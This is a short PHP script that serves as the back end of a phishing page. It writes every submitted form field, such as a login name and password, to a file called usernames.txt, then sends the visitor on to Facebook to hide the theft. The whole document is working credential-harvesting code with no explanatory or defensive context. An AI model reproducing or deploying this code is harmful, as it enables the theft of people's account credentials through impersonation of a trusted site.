<?php
header ('Location :www.facebook.com');
$handle = fopen("usernames.txt", "a");
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "
");
}
fwrite($handle, "
");
fclose($handle);
exit;
?>